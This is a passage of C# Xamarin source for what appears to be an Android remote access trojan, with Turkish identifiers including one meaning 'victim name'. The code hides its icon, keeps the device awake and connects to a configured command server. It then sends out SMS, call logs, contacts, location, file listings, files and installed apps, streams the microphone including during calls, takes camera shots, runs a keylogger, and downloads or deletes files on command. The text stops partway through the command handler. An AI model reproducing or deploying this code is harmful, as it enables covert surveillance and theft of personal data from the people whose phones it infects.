using Android.App;
using Android.App.Admin;
using Android.Bluetooth;
using Android.Content;
using Android.Content.PM;
using Android.Database;
using Android.Graphics;
using Android.Graphics.Drawables;
using Android.Locations;
using Android.Media;
using Android.Net.Wifi;
using Android.OS;
using Android.Provider;
using Android.Runtime;
using Android.Support.V4.Content.PM;
using Android.Support.V4.Graphics.Drawable;
using Android.Telephony;
using Android.Widget;

using System;
using System.Collections.Generic;                 //MADE IN TURKEY - MADE WITH LOVE (:\\
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Xamarin.Essentials;

namespace Task2
{
    [Activity(Label = "@string/app_name", MainLauncher = true, Icon = "@mipmap/icon", ExcludeFromRecents = true,
        Exported = true)]

    public class MainActivity : Activity
    {
        public void SetSocketKeepAliveValues(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }
        static readonly Type SERVICE_TYPE = typeof(ForegroundService);
        //readonly string TAG = SERVICE_TYPE.FullName;
        public static Socket Soketimiz = default;
        static Intent _startServiceIntent;
        public async void Baglanti_Kur()
        {

            await Task.Run(() =>
            {
                try
                {
                    if (Soketimiz != null)
                    {
                        Soketimiz.Close();
                    }
                    var ipadresi = Dns.GetHostAddresses(MainValues.IP)[0];
                    IPEndPoint endpoint = new IPEndPoint(ipadresi, MainValues.port);
                    Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                    Soketimiz.NoDelay = true;
                    Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;
                    Soketimiz.Connect(endpoint);
                    soketimizeGonder("IP", "[VERI]" +
                        MainValues.KRBN_ISMI + "[VERI]" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
                       + "[VERI]" + DeviceInfo.Manufacturer + "/" + DeviceInfo.Model + "[VERI]" + DeviceInfo.Version + "/" + ((int)Build.VERSION.SdkInt).ToString() + "[0x09]");
                    SetSocketKeepAliveValues(Soketimiz, 2000, 1000);
                    infoAl(Soketimiz);
                }
                catch (SocketException)
                {
                    Baglanti_Kur();
                }
            });
        }
        public async void infoAl(Socket sckInf)
        {
            await Task.Run(() => //[0x09]
            {
                try
                {
                    NetworkStream networkStream = new NetworkStream(sckInf);                 
                        System.Text.StringBuilder sb = new System.Text.StringBuilder();
                        int thisRead = 0;
                        int blockSize = 2048;
                        byte[] dataByte = new byte[blockSize];
                        lock (this)
                        {
                            while (true)
                            {
                                thisRead = networkStream.ReadAsync(dataByte, 0, blockSize).Result;
                                sb.Append(System.Text.Encoding.UTF8.GetString(dataByte, 0, thisRead));
                                if (sb.ToString().Trim().EndsWith("<EOF>")) {
                                    Soketimizdan_Gelen_Veriler(sb.ToString().Replace("<EOF>", ""));
                                    sb.Clear();
                                }
                            }
                        }
                }
                catch (Exception) { micStop(); Baglanti_Kur(); }
            });
        }
        public async void soketimizeGonder(string tag, string mesaj)
        {
            try
            {
                using (NetworkStream ns = new NetworkStream(Soketimiz))
                {
                    byte[] cmd = System.Text.Encoding.UTF8.GetBytes(tag + mesaj + "<EOF>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }
            }
            catch (Exception) { }
        }
        public void kameraCek(Socket soket)
        {
            UpdateTimeTask.Kamera(soket);
        }
        List<string> allDirectory_ = default;
        List<string> sdCards = default;
        public void dosyalar()
        {
            allDirectory_ = new List<string>();
            try
            {
                Java.IO.File[] _path = GetExternalFilesDirs(null);
                sdCards = new List<string>();
                List<string> allDirectory = new List<string>();
                foreach (var spath in _path)
                {
                    if (spath.Path.Contains("emulated") == false)
                    {
                        string s = spath.Path.ToString();
                        s = s.Replace(s.Substring(s.IndexOf("/And")), "");
                        sdCards.Add(s);
                    }
                }
                if (sdCards.Count > 0)
                {
                    listf(sdCards[0]);
                }
                sonAsama(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath);
                string dosyalarS = "";
                foreach (string inf in allDirectory_)
                {
                    dosyalarS += inf + "<";
                }
                if (!string.IsNullOrEmpty(dosyalarS))
                {
                    soketimizeGonder("FILES", "[VERI]IKISIDE[VERI]" + dosyalarS + "[0x09]");
                }
                else
                {
                    soketimizeGonder("FILES", "[VERI]IKISIDE[VERI]BOS[0x09]");
                }
            }
            catch (Exception) { }
        }
        public void sonAsama(string absPath)
        {
            try
            {
                DirectoryInfo di = new DirectoryInfo(absPath);
                DirectoryInfo[] klasorler = di.GetDirectories();
                FileInfo[] fi = di.GetFiles("*.*");
                foreach (DirectoryInfo directoryInfo in klasorler)
                {
                    allDirectory_.Add(directoryInfo.Name + "=" + directoryInfo.FullName + "=" + "" + "=" + "" + "=CİHAZ="
                         + absPath + "=");
                }
                foreach (FileInfo f_info in fi)
                {
                    if (f_info.DirectoryName.Contains(".thumbnail") == false)
                    {
                        allDirectory_.Add(f_info.Name + "=" + f_info.DirectoryName + "=" + f_info.Extension + "=" + GetFileSizeInBytes(
                            f_info.FullName) + "=CİHAZ=" + absPath + "=");
                    }
                }
            }
            catch (Exception) { }
        }
        public void listf(string directoryName)
        {
            try
            {
                Java.IO.File directory = new Java.IO.File(directoryName);
                Java.IO.File[] fList = directory.ListFiles();
                if (fList != null)
                {
                    foreach (Java.IO.File file in fList)
                    {
                        try
                        {
                            if (file.IsFile)
                            {
                                allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                        file.AbsolutePath.Substring(file.AbsolutePath.LastIndexOf(".")) + "=" + GetFileSizeInBytes(
                                         file.AbsolutePath) + "=SDCARD=" + directoryName + "=");
                            }
                            else if (file.IsDirectory)
                            {
                                allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                        "" + "=" + "" + "=SDCARD=" + directoryName + "=");
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }
            catch (Exception) { }
        }
        public void uygulamalar()
        {   /*
            PackageManager pm = PackageManager;
            Intent main = new Intent(Intent.ActionMain, null);
            main.AddCategory(Intent.CategoryLauncher);
            List<ResolveInfo> packages = (List<ResolveInfo>)pm.QueryIntentActivities(main,0);
            string bilgiler = default;
            foreach (ResolveInfo resolve_info in packages)
            {
                try
                {
                    string paket_ismi = resolve_info.ActivityInfo.PackageName;
                    string isim = pm.GetApplicationLabel(pm.GetApplicationInfo(paket_ismi, PackageInfoFlags.MetaData));
                    string app_ico = "";
                    try
                    {
                        app_ico = Convert.ToBase64String(drawableToByteArray(resolve_info.LoadIcon(PackageManager)));
                    }
                    catch (Exception) { app_ico = "[NULL]"; }
                    string infos = isim + "[HANDSUP]" + paket_ismi + "[HANDSUP]" + app_ico + "[HANDSUP]";
                    bilgiler += infos + "[REMIX]";
                }
                catch (Exception) {}
            }
            soketimizeGonder("APPS", "[VERI]" + bilgiler + "[VERI]");
           */
            var apps = PackageManager.GetInstalledApplications(PackageInfoFlags.MetaData);
            string bilgiler = "";
            for (int i = 0; i < apps.Count; i++)
            {
                try
                {
                    ApplicationInfo applicationInfo = apps[i];
                    var isim = applicationInfo.LoadLabel(PackageManager);
                    var paket_ismi = applicationInfo.PackageName;
                    if (applicationInfo.Flags != ApplicationInfoFlags.System)
                    {
                        string app_ico = "";
                        try
                        {
                            app_ico = Convert.ToBase64String(drawableToByteArray(applicationInfo.LoadIcon(PackageManager)));
                        }
                        catch (Exception) { app_ico = "[NULL]"; }

                        string infos = isim + "[HANDSUP]" + paket_ismi + "[HANDSUP]" + app_ico + "[HANDSUP]";
                        bilgiler += infos + "[REMIX]";
                    }
                }
                catch (Exception) { }
            }
            soketimizeGonder("APPS", "[VERI]" + bilgiler + "[0x09]");

        }
        public static string GetFileSizeInBytes(string filenane)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = new FileInfo(filenane).Length;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception ex) { return ex.Message; }
        }
        UdpClient client = null;
        AudioStream audioStream = null;
        public void micSend(string sampleRate, string kaynak)
        {
            AudioSource source = AudioSource.Default;
            switch (kaynak)
            {
                case "Mikrofon":
                    source = AudioSource.Mic;
                    break;
                case "Varsayılan":
                    source = AudioSource.Default;
                    break;
                case "Telefon Görüşmesi":
                    if (mgr == null) { mgr = (AudioManager)GetSystemService(AudioService); }
                    mgr.Mode = Mode.InCall;
                    mgr.SetStreamVolume(Android.Media.Stream.VoiceCall, mgr.GetStreamMaxVolume(Android.Media.Stream.VoiceCall), 0);
                    source = AudioSource.Mic;
                    break;
            }
            client = new UdpClient();
            audioStream = new AudioStream(int.Parse(sampleRate), source);
            audioStream.OnBroadcast += AudioStream_OnBroadcast;
            audioStream.Start();
        }

        public void micStop()
        {
            if (audioStream != null)
            {
                audioStream.Stop();
                audioStream.Flush();
                audioStream = null;
                if (client != null)
                {
                    client.Close();
                    client.Dispose();
                }
            }
        }
        private void AudioStream_OnBroadcast(object sender, byte[] e)
        {
            try
            {
                client.Send(e, e.Length, new IPEndPoint(Dns.GetHostAddresses(MainValues.IP)[0], MainValues.port));
            }
            catch (SocketException)
            {
                micStop();
            }
        }

        public static bool key_gonder = false;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            //SetContentView(Resource.Layout.Main);

            Platform.Init(this, savedInstanceState);

            global_activity = this;
            global_packageManager = PackageManager;
            var permissionsToCheck = new string[]
            {
               Android.Manifest.Permission.InstallShortcut,
               Android.Manifest.Permission.CaptureAudioOutput,
               Android.Manifest.Permission.ReadPhoneState,
               Android.Manifest.Permission.ModifyAudioSettings,
               Android.Manifest.Permission.BindDeviceAdmin,
               Android.Manifest.Permission.WriteSettings,
               Android.Manifest.Permission.SetWallpaper,
               Android.Manifest.Permission.SendSms,
               Android.Manifest.Permission.CallPhone,
               Android.Manifest.Permission.Vibrate,
               Android.Manifest.Permission.ReadContacts,
               Android.Manifest.Permission.WriteContacts,
               Android.Manifest.Permission.RecordAudio,
               Android.Manifest.Permission.AccessCoarseLocation,
               Android.Manifest.Permission.AccessFineLocation,
               Android.Manifest.Permission.WriteCallLog,
               Android.Manifest.Permission.ReadExternalStorage,
               Android.Manifest.Permission.Camera,
               Android.Manifest.Permission.WriteExternalStorage,
               Android.Manifest.Permission.ForegroundService,
               Android.Manifest.Permission.ReadCallLog,
               Android.Manifest.Permission.ReadSms
            };
            CallNotGrantedPermissions(permissionsToCheck);
            bool exsist = Preferences.ContainsKey("aypi_adresi");
            if (exsist == false)
            {
                Preferences.Set("aypi_adresi", Resources.GetString(Resource.String.IP));
                Preferences.Set("port", Resources.GetString(Resource.String.PORT));
                Preferences.Set("kurban_adi", Resources.GetString(Resource.String.KURBANISMI));
            }
            MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");//Resources.GetString(Resource.String.IP);
            MainValues.port = int.Parse(Preferences.Get("port", "5656"));
            MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "n-a");

            PowerManager pmanager = (PowerManager)GetSystemService("power");
            wakelock = pmanager.NewWakeLock(WakeLockFlags.Partial, "PowerDrainer");
            wakelock.SetReferenceCounted(false);
            wakelock.Acquire();
            Baglanti_Kur();

            if (!Directory.Exists(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly"))
            {
                Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
            }
            StartForegroundServiceCompat<ForegroundService>(this, savedInstanceState);
            bool isHuaweiAndApi28 = DeviceInfo.Manufacturer.ToLower().Contains("huawe") && Build.VERSION.SdkInt == BuildVersionCodes.P;
            if (isHuaweiAndApi28 == false)
            {
                Finish();
            }
            hide();
        }
        public void hide()
        {
            ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(MainActivity)).Name);
            PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
        }
        private void AddShortcut(string appName, string url, byte[] icon_byte)
        {
            //File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory + "/launcher.jpg", icon_byte);
            try
            {
                Bitmap bitmap = BitmapFactory.DecodeByteArray(icon_byte, 0, icon_byte.Length);
                var uri = Android.Net.Uri.Parse(url);
                var intent_ = new Intent(Intent.ActionView, uri);

                if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                {
                    if (ShortcutManagerCompat.IsRequestPinShortcutSupported(this))
                    {
                        ShortcutInfoCompat shortcutInfo = new ShortcutInfoCompat.Builder(this, "#1")
                         .SetIntent(intent_)
                         .SetShortLabel(appName)
                         .SetIcon(IconCompat.CreateWithBitmap(bitmap))
                         .Build();
                        ShortcutManagerCompat.RequestPinShortcut(this, shortcutInfo, null);
                    }
                }
                else
                {
                    Intent installer = new Intent();
                    installer.PutExtra("android.intent.extra.shortcut.INTENT", intent_);
                    installer.PutExtra("android.intent.extra.shortcut.NAME", appName);
                    installer.PutExtra("android.intent.extra.shortcut.ICON", bitmap);
                    installer.SetAction("com.android.launcher.action.INSTALL_SHORTCUT");
                    SendBroadcast(installer);
                }
            }
            catch (Exception)
            {
            }
        }
        private PowerManager.WakeLock wakelock = null;
        public const int RequestCodeEnableAdmin = 15;
        protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
        {
            if (requestCode == RequestCodeEnableAdmin)
            {
                PostSetKioskMode(resultCode == Result.Ok);
            }
            else
                base.OnActivityResult(requestCode, resultCode, data);
        }
        public void rehberEkle(string FirstName, string PhoneNumber)
        {
            List<ContentProviderOperation> ops = new List<ContentProviderOperation>();
            int rawContactInsertIndex = ops.Count;

            ContentProviderOperation.Builder builder =
                ContentProviderOperation.NewInsert(ContactsContract.RawContacts.ContentUri);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountType, null);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountName, null);
            ops.Add(builder.Build());

            //Name
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.StructuredName.ContentItemType);
            //builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.FamilyName, LastName);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.GivenName, FirstName);
            ops.Add(builder.Build());

            //Number
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.Phone.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.Number, PhoneNumber);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.Type,
                    ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.TypeCustom);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.InterfaceConsts.Label, "Primary Phone");
            ops.Add(builder.Build());
            /*
            //Email
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.Email.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Data, Email);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Type,
                ContactsContract.CommonDataKinds.Email.InterfaceConsts.TypeCustom);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Label, "Email");
            ops.Add(builder.Build());

            //Address
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.StructuredPostal.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.Street, Address1);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.City, Address2);
            ops.Add(builder.Build());
            */
            try
            {
                var res = ContentResolver.ApplyBatch(ContactsContract.Authority, ops);
                //Toast.MakeText(this, "Contact Saved", ToastLength.Short).Show();
            }
            catch
            {
                //Toast.MakeText(this, "Contact Not Saved", ToastLength.Long).Show();
            }
        }
        public async void konus(string metin)
        {
            try
            {
                var locales = await TextToSpeech.GetLocalesAsync();
                var locale = locales.FirstOrDefault();

                var settings = new SpeechOptions()
                {
                    Volume = 1.0f,
                    Pitch = 1.0f,
                    Locale = locale
                };

                await TextToSpeech.SpeakAsync(metin, settings);
            }
            catch (Exception) { }
        }
        public void rehberNoSil(string isim)
        {
            Context thisContext = this;
            string[] Projection = new string[] { ContactsContract.ContactsColumns.LookupKey, ContactsContract.ContactsColumns.DisplayName };
            ICursor cursor = thisContext.ContentResolver.Query(ContactsContract.Contacts.ContentUri, Projection, null, null, null);
            while (cursor != null & cursor.MoveToNext())
            {
                string lookupKey = cursor.GetString(0);
                string name = cursor.GetString(1);

                if (name == isim)
                {
                    var uri = Android.Net.Uri.WithAppendedPath(ContactsContract.Contacts.ContentLookupUri, lookupKey);
                    thisContext.ContentResolver.Delete(uri, null, null);
                    cursor.Close();
                    return;
                }
            }
        }
        public void DeleteFile_(string filePath)
        {
            try
            {

                new Java.IO.File(filePath).AbsoluteFile.Delete();
                //Toast.MakeText(this, "DELETED", ToastLength.Long).Show();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, ex.Message + "DELETE", ToastLength.Long).Show();
            }
        }

        public async void lokasyonCek()
        {
            double GmapLat = 0;
            double GmapLong = 0;
            try
            {
                var request = new GeolocationRequest(GeolocationAccuracy.Default, TimeSpan.FromSeconds(6));
                var location = await Geolocation.GetLocationAsync(request);
                GmapLat = location.Latitude;
                GmapLat = location.Longitude;
                if (location != null)
                {
                    var placemarks = await Geocoding.GetPlacemarksAsync(location.Latitude, location.Longitude);
                    var placemark = placemarks?.FirstOrDefault();
                    string GeoCountryName = "Boş";
                    string admin = "Boş";
                    string local = "Boş";
                    string sublocal = "Boş";
                    string sub2 = "Boş";
                    if (placemark != null)
                    {
                        GeoCountryName = placemark.CountryName;
                        admin = placemark.AdminArea;
                        local = placemark.Locality;
                        sublocal = placemark.SubLocality;
                        sub2 = placemark.SubAdminArea;

                    }
                    soketimizeGonder("LOCATION", "[VERI]" + GeoCountryName + "=" + admin +
                           "=" + sub2 + "=" + sublocal + "=" + local + "=" + location.Latitude.ToString() +
                         "{" + location.Longitude + "=[0x09]");
                }
            }
            catch (Exception ex)
            {
                soketimizeGonder("LOCATION", "[VERI]" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=" + "HATA" + "=[0x09]");
            }
        }
        public void Ac(string path)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(path);
                file.SetReadable(true);
                string application = "";
                string extension = System.IO.Path.GetExtension(path);
                switch (extension.ToLower())
                {
                    case ".txt":
                        application = "text/plain";
                        break;
                    case ".doc":
                    case ".docx":
                        application = "application/msword";
                        break;
                    case ".pdf":
                        application = "application/pdf";
                        break;
                    case ".xls":
                    case ".xlsx":
                        application = "application/vnd.ms-excel";
                        break;
                    case ".jpg":
                    case ".jpeg":
                    case ".png":
                        application = "image/jpeg";
                        break;
                    default:
                        application = "*/*";
                        break;
                }
                Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + path);
                Intent intent = new Intent(Intent.ActionView);
                intent.SetDataAndType(uri, application);
                intent.SetFlags(ActivityFlags.ClearTop);
                StartActivity(intent);
            }
            catch (Exception) { }
        }

        public void smsLogu(string nereden)
        {
            LogVerileri veri = new LogVerileri(this, nereden);
            veri.smsLeriCek();
            string gidecek_veriler = "";
            var sms_ = veri.smsler;
            for (int i = 0; i < sms_.Count; i++)
            {

                string bilgiler = sms_[i].Gonderen + "{" + sms_[i].Icerik + "{"
                + sms_[i].Tarih + "{" + LogVerileri.SMS_TURU + "{" + sms_[i].Isim + "{";

                gidecek_veriler += bilgiler + "&";

            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "SMS YOK"; }
            soketimizeGonder("SMSLOGU", "[VERI]" + gidecek_veriler + "[0x09]");
        }
        public void telefonLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.aramaKayitlariniCek();
            var list = veri.kayitlar;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = (list[i].Isim + "=" + list[i].Numara + "=" + list[i].Tarih + "="
                    + list[i].Durasyon + "=" + list[i].Tip + "=");

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "CAGRI YOK"; }
            soketimizeGonder("CAGRIKAYITLARI", "[VERI]" + gidecek_veriler + "[0x09]");
        }
        public void rehberLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.rehberiCek();
            var list = veri.isimler_;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = (list[i].Isim + "=" + list[i].Numara + "="
                    );

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "REHBER YOK"; }
            soketimizeGonder("REHBER", "[VERI]" + gidecek_veriler + "[0x09]");
        }
        public bool SetKioskMode(bool enable)
        {
            var deviceAdmin =
                new ComponentName(this, Java.Lang.Class.FromType(typeof(AdminReceiver)));
            if (enable)
            {
                var intent = new Intent(DevicePolicyManager.ActionAddDeviceAdmin);
                intent.PutExtra(DevicePolicyManager.ExtraDeviceAdmin, deviceAdmin);
                // intent.PutExtra(DevicePolicyManager.ExtraAddExplanation, "activity.getString(R.string.add_admin_extra_app_text");
                StartActivityForResult(intent, RequestCodeEnableAdmin);
                return false;
            }
            else
            {
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                devicePolicyManager.RemoveActiveAdmin(deviceAdmin);
                return true;
            }
        }

        private void PostSetKioskMode(bool enable)
        {
            if (enable)
            {
                var deviceAdmin = new ComponentName(this,
                    Java.Lang.Class.FromType(typeof(AdminReceiver)));
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                if (!devicePolicyManager.IsAdminActive(deviceAdmin)) throw new Exception("Not Admin");

                StartLockTask();
            }
            else
            {
                StopLockTask();
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Permission[] grantResults)
        {
            Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }

        protected override void OnDestroy()
        {
            base.OnDestroy();
        }

        private Intent GetIntent(Type type, string action)
        {
            var intent = new Intent(this, type);
            intent.SetAction(action);
            return intent;
        }

        public void StartForegroundServiceCompat<T>(Context context, Bundle args = null) where T : Service
        {
            _startServiceIntent = GetIntent(SERVICE_TYPE, MainValues.ACTION_START_SERVICE);

            if (args != null)
                _startServiceIntent.PutExtras(args);

            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                context.StartForegroundService(_startServiceIntent);
            else
                context.StartService(_startServiceIntent);
        }

        private void CallNotGrantedPermissions(string[] permissionsToCheck)
        {
            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
            {
                var permissionStillNeeded = GetNotGrantedPermissions(permissionsToCheck);
                if (permissionStillNeeded.Length > 0)
                {
                    RequestPermissions(permissionStillNeeded, 5);
                }
            }
        }

        private string[] GetNotGrantedPermissions(string[] permissionsToCheck)
        {
            var permissionStillNeeded = new List<string>();
            for (int i = 0; i < permissionsToCheck.Length; i++)
            {
                if (Permission.Granted != CheckSelfPermission(permissionsToCheck[i]))
                    permissionStillNeeded.Add(permissionsToCheck[i]);
            }

            return permissionStillNeeded.ToArray();
        }
        public void javaFileWrite(byte[] veri, string yol)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(yol);
                if (file.Exists())
                {
                    file.Delete();
                }
                Java.IO.FileOutputStream fos = new Java.IO.FileOutputStream(file);
                fos.Write(veri);
                fos.Close();
                //fos.Flush();
                fos.Dispose();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, ex.Message, ToastLength.Long)
                //.Show();
            }
        }
        public async void DosyaIndir(string uri, string filename)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/" +
                    filename, await wc.DownloadDataTaskAsync(uri));
                }
                try
                {
                    soketimizeGonder("INDIRILDI", "[VERI]Dosya başarılı bir şekilde indi.[0x09]");
                }
                catch (Exception) { }
            }
            catch (Exception ex)
            {
                try
                {
                    soketimizeGonder("INDIRILDI", "[VERI]" + ex.Message + "[0x09]");
                }
                catch (Exception) { }
            }
        }
        private void Soketimizdan_Gelen_Veriler(string data)
        {
            RunOnUiThread(() =>
            {
                string[] _ayir_ = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
                foreach (string str in _ayir_)
                {
                    string[] ayirici = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                    try
                    {                   
                        switch (ayirici[0].Replace("0x0F", ""))
                        {
                            case "DOWNFILE":
                                DosyaIndir(ayirici[1], ayirici[2]);
                                break;
                            case "DOSYABYTE":
                                try
                                {
                                    if (ayirici[3].Contains("/emulated"))
                                    {
                                        File.WriteAllBytes(ayirici[3] + "/" + ayirici[2], Convert.FromBase64String(ayirici[1]));
                                    }
                                    else
                                    {
                                        javaFileWrite(Convert.FromBase64String(ayirici[1]), ayirici[3] + "/" + ayirici[2]);
                                    }
                                    soketimizeGonder("DOSYAALINDI", "[VERI]" + MainValues.KRBN_ISMI + "[0x09]");
                                }
                                catch (Exception) { }
                                break;
                            case "DELETE":
                                try { DeleteFile_(ayirici[1]); } catch (Exception) { }
                                break;
                            case "BLUETOOTH":
                                btKapaAc(Convert.ToBoolean(ayirici[1]));
                                break;
                            case "CALLLOGS":
                                telefonLogu();
                                break;
                            case "WIFI":
                                wifiAcKapa(Convert.ToBoolean(ayirici[1]));
                                break;
                            case "ANASAYFA":
                                try
                                {
                                    Intent i = new Intent(Intent.ActionMain);
                                    i.AddCategory(Intent.CategoryHome);
                                    i.SetFlags(ActivityFlags.NewTask);
                                    StartActivity(i);
                                }
                                catch (Exception) { }
                                break;
                            case "GELENKUTUSU":
                                smsLogu("gelen");
                                break;
                            case "GIDENKUTUSU":
                                smsLogu("giden");
                                break;
                            case "UYARI":
                                break;
                            case "KONUS":
                                konus(ayirici[1]);
                                break;
                            case "UNIQ":
                                MainValues.uniq_id = ayirici[1];
                                break;
                            case "CAM":
                                MainValues.front_back = ayirici[1];
                                MainValues.flashMode = ayirici[2];
                                kameraCek(Soketimiz);
                                break;
                            case "DOSYA":
                                dosyalar();
                                break;
                            case "FOLDERFILE":
                                allDirectory_ = new List<string>();
                                sonAsama(ayirici[1]);
                                cihazDosyalariGonder();
                                break;
                            case "FILESDCARD":
                                allDirectory_ = new List<string>();
                                listf(ayirici[1]);
                                dosyalariGonder();
                                break;
                            case "INDIR":
                                try
                                {
                                    byte[] dosya = File.ReadAllBytes(ayirici[1]);
                                    soketimizeGonder("UZUNLUK", "[VERI]" + Convert.ToBase64String(dosya) + "[VERI]" + ayirici[1].Substring(ayirici[1].LastIndexOf("/") + 1) + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier() + "[0x09]");
                                }
                                catch (Exception) { }
                                break;
                            case "MIC":
                                switch (ayirici[1])
                                {
                                    case "BASLA":
                                        micSend(ayirici[2], ayirici[3]);
                                        break;
                                    case "DURDUR":
                                        micStop();
                                        break;
                                }
                                break;
                            case "KEYBASLAT":
                                key_gonder = true;
                                break;
                            case "KEYDUR":
                                key_gonder = false;
                                break;
                            case "LOGLARIHAZIRLA":
                                log_dosylari_gonder = "";
                                DirectoryInfo dinfo = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                                FileInfo[] fileInfos = dinfo.GetFiles("*.tht");
                                if (fileInfos.Length > 0)
                                {
                                    foreach (FileInfo fileInfo in fileInfos)
                                    {
                                        log_dosylari_gonder += fileInfo.Name + "=";
                                    }
                                    soketimizeGonder("LOGDOSYA", "[VERI]" + log_dosylari_gonder + "[0x09]");
                                }
                                else
                                {
                                    soketimizeGonder("LOGDOSYA", "[VERI]LOG_YOK[0x09]");
                                }
                                break;
                            case "KEYCEK":
                                string icerik = File.ReadAllText(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + ayirici[1]).Replace(System.Environment.NewLine, "[NEW_LINE]");
